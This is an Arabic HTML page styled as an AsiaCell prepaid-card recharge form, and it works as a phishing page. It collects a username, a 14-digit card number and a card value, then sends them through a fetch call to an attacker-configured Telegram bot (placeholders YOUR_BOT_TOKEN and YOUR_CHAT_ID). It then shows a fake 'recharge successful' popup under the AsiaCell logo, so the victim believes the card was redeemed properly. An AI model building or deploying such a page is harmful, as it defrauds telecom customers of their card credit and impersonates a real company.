<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال بيانات آسيا سيل إلى البوت</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 10px;
            color: #333;
            font-size: 0.8em;
        }
        .container {
            max-width: 250px;
            margin: 0 auto;
            background-color: white;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
        }
        h1 {
            color: #e31937;
            text-align: center;
            font-size: 1.2em;
            margin: 5px 0;
        }
        .form-group {
            margin-bottom: 8px;
        }
        label {
            display: block;
            margin-bottom: 3px;
            font-weight: bold;
            font-size: 0.9em;
        }
        input, select {
            width: 100%;
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 0.8em;
        }
        button {
            background-color: #e31937;
            color: white;
            border: none;
            padding: 6px 10px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            margin-top: 5px;
        }
        button:hover {
            background-color: #c0102e;
        }
        #status {
            margin-top: 8px;
            text-align: center;
            font-weight: bold;
            font-size: 0.7em;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            text-align: center;
            z-index: 1000;
            width: 200px;
        }
        .popup img {
            width: 50px;
            margin-bottom: 10px;
        }
        .popup h2 {
            color: #e31937;
            margin: 5px 0;
            font-size: 1em;
        }
        .popup p {
            font-size: 0.8em;
            margin: 5px 0;
        }
        .popup button {
            padding: 4px 8px;
            font-size: 0.7em;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>إرسال بيانات بطاقة آسيا سيل</h1>
        
        <div class="form-group">
            <label for="username">اسم المستخدم:</label>
            <input type="text" id="username" required>
        </div>
        
        <div class="form-group">
            <label for="cardNumber">رقم البطاقة (14 رقمًا فقط):</label>
            <input type="text" id="cardNumber" required maxlength="14" pattern="\d{14}" 
                   title="الرجاء إدخال 14 أرقام فقط">
        </div>
        
        <div class="form-group">
            <label for="cardValue">قيمة البطاقة:</label>
            <select id="cardValue">
                <option value="5000">5,000 دينار</option>
                <option value="10000">10,000 دينار</option>
                <option value="20000">20,000 دينار</option>
                <option value="50000">50,000 دينار</option>
            </select>
        </div>
        
        <button onclick="sendToTelegramBot()">إرسال البيانات</button>
        
        <div id="status"></div>
    </div>

    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
        <img src="https://www.asiacell.com/images/logo.png" alt="AsiaCell Logo">
        <h2>تم الشحن بنجاح!</h2>
        <p>شكراً لاستخدامك خدمة آسيا سيل</p>
        <button onclick="closePopup()">موافق</button>
    </div>

    <script>
        function validateCardNumber(cardNumber) {
            return /^\d{14}$/.test(cardNumber);
        }

        function showPopup() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('popup').style.display = 'block';
        }

        function closePopup() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('popup').style.display = 'none';
        }

        function sendToTelegramBot() {
            const username = document.getElementById('username').value;
            const cardNumber = document.getElementById('cardNumber').value;
            const cardValue = document.getElementById('cardValue').value;
            
            if (!username || !cardNumber) {
                document.getElementById('status').textContent = 'الرجاء ملء جميع الحقول المطلوبة';
                document.getElementById('status').style.color = 'red';
                return;
            }
            
            if (!validateCardNumber(cardNumber)) {
                document.getElementById('status').textContent = 'رقم البطاقة يجب أن يتكون من 14 رقمًا فقط';
                document.getElementById('status').style.color = 'red';
                return;
            }
            
            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            
            const message = `بيانات بطاقة آسيا سيل جديدة:
اسم المستخدم: ${username}
رقم البطاقة: ${cardNumber}
قيمة البطاقة: ${cardValue} دينار`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        showPopup();
                        document.getElementById('username').value = '';
                        document.getElementById('cardNumber').value = '';
                        document.getElementById('status').textContent = '';
                    } else {
                        document.getElementById('status').textContent = 'حدث خطأ أثناء الإرسال';
                        document.getElementById('status').style.color = 'red';
                    }
                })
                .catch(error => {
                    document.getElementById('status').textContent = 'حدث خطأ في الاتصال: ' + error;
                    document.getElementById('status').style.color = 'red';
                });
        }
    </script>
</body>
</html>
